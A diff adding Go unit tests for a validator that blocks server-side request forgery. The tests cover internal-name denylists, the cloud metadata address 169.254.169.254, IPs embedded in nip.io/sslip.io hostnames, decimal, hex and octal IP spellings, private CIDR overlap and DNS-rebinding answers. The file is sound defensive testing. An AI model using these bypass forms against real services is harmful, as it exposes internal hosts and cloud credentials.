+		{"::ffff:198.18.0.1", "is a benchmarking-range address (198.18.0.0/15)"},
+		{"::ffff:240.0.0.1", "is a reserved-range address (240.0.0.0/4)"},
+	}
+	for _, c := range nonPublic {
+		addr, ok := parseCanonicalIP(c.addr)
+		if !ok {
+			t.Fatalf("%q did not parse", c.addr)
+		}
+		if got := nonPublicIPReason(addr); got != c.reason {
+			t.Errorf("%q: got %q, want %q", c.addr, got, c.reason)
+		}
+	}
+	for _, v := range []string{
+		"93.184.216.34", "8.8.8.8", "1.1.1.1", "100.63.255.255", "100.128.0.0",
+		"172.15.255.255", "172.32.0.0", "198.17.255.255", "198.20.0.0", "223.255.255.255",
+		"2606:4700::1111", "2001:db7::1", "2001:db9::1", "fbff::1", "fec0::1", "::ffff:8.8.8.8",
+	} {
+		addr, ok := parseCanonicalIP(v)
+		if !ok {
+			t.Fatalf("%q did not parse", v)
+		}
+		if got := nonPublicIPReason(addr); got != "" {
+			t.Errorf("%q must be public, got %q", v, got)
+		}
+	}
+}
+
+func TestCanonicalIPHelpers(t *testing.T) {
+	for _, v := range []string{"127.0.0.1", "::1", "::ffff:1.2.3.4", "2001:db8::1", "255.255.255.255"} {
+		if _, ok := parseCanonicalIP(v); !ok {
+			t.Errorf("parseCanonicalIP(%q) must succeed", v)
+		}
+	}
+	for _, v := range []string{"", "127.1", "010.0.0.1", "0x7f000001", "2130706433", "fe80::1%eth0", "1.2.3.4.5", "256.0.0.1", "example.com"} {
+		if _, ok := parseCanonicalIP(v); ok {
+			t.Errorf("parseCanonicalIP(%q) must fail", v)
+		}
+	}
+	for _, v := range []string{"2130706433", "0x7f000001", "0Xff", "0177.0.0.1", "127.1", "010.0.0.1", "1.2.3", "0"} {
+		if !looksLikeIPLiteral(v) {
+			t.Errorf("looksLikeIPLiteral(%q) must be true", v)
+		}
+	}
+	for _, v := range []string{"", "example.com", "1.2.3.example", "a.1", "1..2", ".1", "1.", "::1"} {
+		if looksLikeIPLiteral(v) {
+			t.Errorf("looksLikeIPLiteral(%q) must be false", v)
+		}
+	}
+	for _, v := range []string{"example.com", "a.b1", "localhost", "x"} {
+		if !tldNotAllNumeric(v) {
+			t.Errorf("tldNotAllNumeric(%q) must be true", v)
+		}
+	}
+	for _, v := range []string{"example.123", "1.2.3.4", "example.com.", "", "7"} {
+		if tldNotAllNumeric(v) {
+			t.Errorf("tldNotAllNumeric(%q) must be false", v)
+		}
+	}
+}
+
+// D1: the internal-name denylist applies with or without block_internal,
+// to a scope_target and to the host of a url, case-insensitively and with
+// one trailing dot ignored.
+func TestInternalNameDenylist(t *testing.T) {
+	names := []string{
+		"localhost",
+		"api.localhost",
+		"printer.local",
+		"metadata.google.internal",
+		"db.internal",
+		"x.home.arpa",
+		"nas.lan",
+		"wiki.intranet",
+		"fs.corp",
+		"vault.private",
+		"LOCALHOST",
+		"Metadata.Google.Internal",
+		"localhost.",
+	}
+	const want = "target resolves to an internal name — always blocked"
+	for _, blockInternal := range []bool{false, true} {
+		scope := &manifest.ArgDef{Name: "t", Type: "scope_target", BlockInternal: blockInternal}
+		url := &manifest.ArgDef{Name: "u", Type: "url", BlockInternal: blockInternal}
+		for _, n := range names {
+			_, err := ValidateArg(scope, n)
+			if err == nil || !strings.Contains(err.Error(), want) {
+				t.Errorf("scope_target %q block_internal=%v: want internal-name refusal, got %v", n, blockInternal, err)
+			}
+			_, err = ValidateArg(url, "http://"+n+":8080/path")
+			if err == nil || !strings.Contains(err.Error(), want) {
+				t.Errorf("url host %q block_internal=%v: want internal-name refusal, got %v", n, blockInternal, err)
+			}
+		}
+	}
+	exact := "validation error for 't': " + want
+	if _, err := ValidateArg(&manifest.ArgDef{Name: "t", Type: "scope_target"}, "localhost"); err == nil || err.Error() != exact {
+		t.Errorf("want %q, got %v", exact, err)
+	}
+	// A suffix must be a whole label: these merely contain the words.
+	for _, n := range []string{"localhost.example.com", "internal-tools.example.com", "mylocal.example.com", "corp.example.com"} {
+		if isInternalName(n) {
+			t.Errorf("%q must not be an internal name", n)
+		}
+	}
+}
+
+// D2: an IP literal embedded in the leading labels of a hostname is put
+// through the range policy; the shape alone is never a refusal.
+func TestEmbeddedIPLiteral(t *testing.T) {
+	open := &manifest.ArgDef{Name: "t", Type: "scope_target"}
+	blocking := &manifest.ArgDef{Name: "t", Type: "scope_target", BlockInternal: true}
+	stubResolver(t, map[string][]string{"93-184-216-34.example.com": {"93.184.216.34"}})
+
+	// Metadata is always blocked, even without block_internal.
+	_, err := ValidateArg(open, "169.254.169.254.nip.io")
+	if err == nil || !strings.Contains(err.Error(), "always blocked") {
+		t.Errorf("169.254.169.254.nip.io without block_internal: want always-blocked, got %v", err)
+	}
+	// Loopback / private forms are blocked under block_internal.
+	for _, v := range []string{"127.0.0.1.nip.io", "10-0-0-1.nip.io", "192.168.1.1.sslip.io", "172-16-0-1.nip.io"} {
+		_, err := ValidateArg(blocking, v)
+		if err == nil || !strings.Contains(err.Error(), "blocked by block_internal policy") {
+			t.Errorf("%q with block_internal: want policy refusal, got %v", v, err)
+		}
+	}
+	// ...and allowed without it, like any other hostname.
+	for _, v := range []string{"127.0.0.1.nip.io", "10-0-0-1.nip.io"} {
+		if _, err := ValidateArg(open, v); err != nil {
+			t.Errorf("%q without block_internal: unexpected error %v", v, err)
+		}
+	}
+	// A public embedded address continues through the ordinary checks.
+	if _, err := ValidateArg(blocking, "93-184-216-34.example.com"); err != nil {
+		t.Errorf("public dashed quad under block_internal must pass: %v", err)
+	}
+	// url hosts get the same treatment.
+	u := &manifest.ArgDef{Name: "u", Type: "url", BlockInternal: true}
+	if _, err := ValidateArg(u, "http://127.0.0.1.nip.io/x"); err == nil || !strings.Contains(err.Error(), "loopback") {
+		t.Errorf("url 127.0.0.1.nip.io: want loopback refusal, got %v", err)
+	}
+	if _, err := ValidateArg(&manifest.ArgDef{Name: "u", Type: "url"}, "http://169.254.169.254.xip.io/"); err == nil || !strings.Contains(err.Error(), "always blocked") {
+		t.Errorf("url 169.254.169.254.xip.io: want always-blocked, got %v", err)
+	}
+
+	// The extractor itself.
+	for _, c := range []struct {
+		host string
+		want string
+	}{
+		{"127.0.0.1.nip.io", "127.0.0.1"},
+		{"10-0-0-1.nip.io", "10.0.0.1"},
+		{"10-0-0-1", "10.0.0.1"},
+		{"255-255-255-255.x", "255.255.255.255"},
+		{"example.com", ""},
+		{"1.2.3.example.com", ""},    // only three numeric labels
+		{"010.0.0.1.nip.io", ""},     // non-canonical quad is not extracted
+		{"256-0-0-1.nip.io", ""},     // group out of range
+		{"10-0-0.nip.io", ""},        // three groups
+		{"10-0-0-1-2.nip.io", ""},    // five groups
+		{"1000-0-0-1.nip.io", ""},    // four digits
+		{"a-b-c-d.nip.io", ""},       // not digits
+		{"::ffff:127.0.0.1.nip", ""}, // not a dotted quad
+	} {
+		addr, ok := embeddedIPLiteral(c.host)
+		if c.want == "" {
+			if ok {
+				t.Errorf("%q: must not extract an address, got %v", c.host, addr)
+			}
+			continue
+		}
+		if !ok || addr.String() != c.want {
+			t.Errorf("%q: want %s, got %v (ok=%v)", c.host, c.want, addr, ok)
+		}
+	}
+}
+
+// D3: a range is tested for overlap with every blocked range, for IPv4 and
+// IPv6, as a scope_target and as a cidr.
+func TestCIDROverlap(t *testing.T) {
+	for _, typ := range []string{"scope_target", "cidr"} {
+		open := &manifest.ArgDef{Name: "c", Type: typ}
+		blocking := &manifest.ArgDef{Name: "c", Type: typ, BlockInternal: true}
+		refused := []string{
+			"8.0.0.0/5",           // public base, contains 10.0.0.0/8
+			"10.0.0.0/24",         // inside 10.0.0.0/8
+			"10.1.2.3/8",          // unmasked spelling of the same range
+			"192.0.0.0/8",         // contains 192.168.0.0/16 and 192.0.2.0/24
+			"0.0.0.0/0",           // contains everything
+			"2001:db8::/32",       // documentation range exactly
+			"2001:db8:1::/48",     // inside it
+			"2001::/16",           // contains it
+			"fc00::/7",            // unique-local
+			"fd00::/8",            // inside unique-local
+			"::/0",                // everything
+			"::ffff:10.0.0.0/104", // IPv4-mapped spelling of 10.0.0.0/8
+		}
+		for _, v := range refused {
+			_, err := ValidateArg(blocking, v)
+			if err == nil || !strings.Contains(err.Error(), "blocked") {
+				t.Errorf("%s %q with block_internal: want overlap refusal, got %v", typ, v, err)
+			}
+		}
+		// The supernet case carries the policy wording of the range it
+		// overlaps.
+		want := "validation error for 'c': target resolves to a private address (blocked by block_internal policy)"
+		if _, err := ValidateArg(blocking, "8.0.0.0/5"); err == nil || err.Error() != want {
+			t.Errorf("%s 8.0.0.0/5: want %q, got %v", typ, want, err)
+		}
+		// Link-local overlap is refused with or without block_internal.
+		for _, v := range []string{"169.254.0.0/16", "169.0.0.0/8", "160.0.0.0/4", "fe80::/10", "fe80::/64", "fe00::/7", "0.0.0.0/0", "::/0"} {
+			for _, def := range []*manifest.ArgDef{open, blocking} {
+				_, err := ValidateArg(def, v)
+				if err == nil || !strings.Contains(err.Error(), "always blocked") {
+					t.Errorf("%s %q block_internal=%v: want always-blocked, got %v", typ, v, def.BlockInternal, err)
+				}
+			}
+		}
+		for _, v := range []string{"93.184.216.0/24", "8.8.8.0/24", "2606:4700::/32", "2606:4700:4700::/48", "1.0.0.0/8"} {
+			if _, err := ValidateArg(blocking, v); err != nil {
+				t.Errorf("%s %q with block_internal: unexpected error %v", typ, v, err)
+			}
+		}
+		// Without block_internal, a non-public range that avoids link-local
+		// still passes.
+		for _, v := range []string{"8.0.0.0/5", "10.0.0.0/24", "2001:db8::/32"} {
+			if _, err := ValidateArg(open, v); err != nil {
+				t.Errorf("%s %q without block_internal: unexpected error %v", typ, v, err)
+			}
+		}
+	}
+
+	// unmapPrefix boundaries.
+	if got := unmapPrefix(netip.MustParsePrefix("::ffff:10.0.0.0/104")); got != netip.MustParsePrefix("10.0.0.0/8") {
+		t.Errorf("unmapPrefix(::ffff:10.0.0.0/104) = %v", got)
+	}
+	if got := unmapPrefix(netip.MustParsePrefix("::ffff:0.0.0.0/95")); got != netip.MustParsePrefix("::ffff:0.0.0.0/95") {
+		t.Errorf("a prefix shorter than the mapped block must be left alone, got %v", got)
+	}
+	if got := unmapPrefix(netip.MustParsePrefix("10.0.0.0/8")); got != netip.MustParsePrefix("10.0.0.0/8") {
+		t.Errorf("unmapPrefix(10.0.0.0/8) = %v", got)
+	}
+}
+
+// D4: under block_internal a name is resolved and every answer is put
+// through the range policy; resolution failure is a refusal. Without
+// block_internal no resolution is attempted at all.
+func TestDNSResolutionUnderBlockInternal(t *testing.T) {
+	// Fail closed through the real resolver: .invalid is reserved by RFC
+	// 2606 and never resolves. This is the only lookup a test may cause.
+	const unresolvable = "no-such-host.invalid"
+	for _, typ := range []string{"scope_target", "url"} {
+		value := unresolvable
+		if typ == "url" {
+			value = "https://" + unresolvable + "/x"
+		}
+		blocking := &manifest.ArgDef{Name: "h", Type: typ, BlockInternal: true}
+		want := "validation error for 'h': could not resolve host '" + unresolvable + "' to verify it is public (block_internal)"
+		if _, err := ValidateArg(blocking, value); err == nil || err.Error() != want {
+			t.Errorf("%s %q: want %q, got %v", typ, value, want, err)
+		}
+		open := &manifest.ArgDef{Name: "h", Type: typ}
+		if _, err := ValidateArg(open, value); err != nil {
+			t.Errorf("%s %q without block_internal must not resolve: %v", typ, value, err)
+		}
+	}
+
+	// Without block_internal the seam is never consulted.
+	called := false
+	prev := lookupHost
+	lookupHost = func(string) ([]netip.Addr, error) { called = true; return nil, errors.New("must not be called") }
+	t.Cleanup(func() { lookupHost = prev })
+	for _, def := range []*manifest.ArgDef{{Name: "h", Type: "scope_target"}, {Name: "h", Type: "url"}} {
+		v := "example.com"
+		if def.Type == "url" {
+			v = "https://example.com/"
+		}
+		if _, err := ValidateArg(def, v); err != nil {
+			t.Errorf("%s without block_internal: %v", def.Type, err)
+		}
+	}
+	if called {
+		t.Fatal("resolver consulted without block_internal")
+	}
+
+	// Every answer is checked: one internal address among public ones is
+	// enough to refuse, in either family and in mapped form.
+	stubResolver(t, map[string][]string{
+		"public.example":      {"93.184.216.34", "2606:4700::1111"},
+		"rebinding.example":   {"93.184.216.34", "10.0.0.1"},
+		"v6-internal.example": {"2606:4700::1111", "fc00::1"},
+		"mapped.example":      {"::ffff:127.0.0.1"},
+		"metadata.example":    {"169.254.169.254"},
+		"empty.example":       {},
+	})
+	blocking := &manifest.ArgDef{Name: "h", Type: "scope_target", BlockInternal: true}
+	if _, err := ValidateArg(blocking, "public.example"); err != nil {
+		t.Errorf("all-public answers must pass: %v", err)
+	}
+	for host, wantSub := range map[string]string{
+		"rebinding.example":   "resolves to a private address (blocked by block_internal policy)",
+		"v6-internal.example": "unique-local",
+		"mapped.example":      "loopback",
+		"metadata.example":    "always blocked",
+		"empty.example":       "could not resolve host 'empty.example'",
+		"missing.example":     "could not resolve host 'missing.example'",
+	} {
+		_, err := ValidateArg(blocking, host)
+		if err == nil || !strings.Contains(err.Error(), wantSub) {
+			t.Errorf("%q: want %q, got %v", host, wantSub, err)
+		}
+	}
+	u := &manifest.ArgDef{Name: "h", Type: "url", BlockInternal: true}
+	if _, err := ValidateArg(u, "https://rebinding.example:8443/path"); err == nil || !strings.Contains(err.Error(), "private") {
+		t.Errorf("url rebinding.example: want private refusal, got %v", err)
+	}
+	if _, err := ValidateArg(u, "https://public.example/"); err != nil {
+		t.Errorf("url public.example: %v", err)
+	}
+	// Literals never touch the resolver.
+	if _, err := ValidateArg(blocking, "93.184.216.34"); err != nil {
+		t.Errorf("literal under block_internal: %v", err)
+	}
+}
+
+// ValidateManifestWithCustomTypes runs the egress lint with the custom type
+// table visible: a custom type whose base is a network target cannot carry
+// block_internal and is refused in an egress manifest.
+func TestValidateManifestWithCustomTypes(t *testing.T) {
+	customTypes := map[string]*manifest.CustomTypeDef{
+		"host":     {Base: "scope_target"},
+		"endpoint": {Base: "url"},
+		"severity": {Base: "enum", Allowed: []string{"low", "high"}},
+		"broken":   {Base: "nonexistent"},
+	}
+	egress := func(argType string) *manifest.Manifest {
+		return &manifest.Manifest{
+			Tool:    manifest.ToolMeta{Name: "t"},
+			Args:    map[string]*manifest.ArgDef{"target": {Name: "target", Type: argType, BlockInternal: true}},
+			Command: manifest.CommandDef{Exec: []string{"curl", "{target}"}},
+		}
+	}
+	want := "argument 'target' uses custom type 'host' as a network target; custom types cannot carry block_internal — use the built-in scope_target type"
+	if err := ValidateManifestWithCustomTypes(egress("host"), customTypes); err == nil || err.Error() != want {
+		t.Errorf("want %q, got %v", want, err)
+	}
+	if err := ValidateManifestWithCustomTypes(egress("endpoint"), customTypes); err == nil || !strings.Contains(err.Error(), "use the built-in url type") {
+		t.Errorf("custom url base: want refusal, got %v", err)
+	}
+	if err := ValidateManifestWithCustomTypes(egress("severity"), customTypes); err != nil {
+		t.Errorf("custom enum in an egress manifest is fine: %v", err)
+	}
+	if err := ValidateManifestWithCustomTypes(egress("scope_target"), customTypes); err != nil {
+		t.Errorf("built-in scope_target with block_internal: %v", err)
+	}
+	if err := ValidateManifestWithCustomTypes(egress("broken"), customTypes); err == nil || !strings.Contains(err.Error(), "invalid base type") {
+		t.Errorf("invalid base: want refusal, got %v", err)
+	}
+	if err := ValidateManifestWithCustomTypes(egress("nope"), customTypes); err == nil || !strings.Contains(err.Error(), "unknown type") {
+		t.Errorf("unknown type: want refusal, got %v", err)
+	}
+	// A non-egress manifest may use a custom network type.
+	m := egress("host")
+	m.Command.Exec = []string{"whois", "{target}"}
+	if err := ValidateManifestWithCustomTypes(m, customTypes); err != nil {
+		t.Errorf("custom network type in a non-egress manifest must pass: %v", err)
+	}
+	// The built-in requirement still applies with custom types present.
+	m = egress("url")
+	m.Args["target"].BlockInternal = false
+	if err := ValidateManifestWithCustomTypes(m, customTypes); err == nil || !strings.Contains(err.Error(), "block_internal is not set") {
+		t.Errorf("built-in url without block_internal: want refusal, got %v", err)
 	}
 }
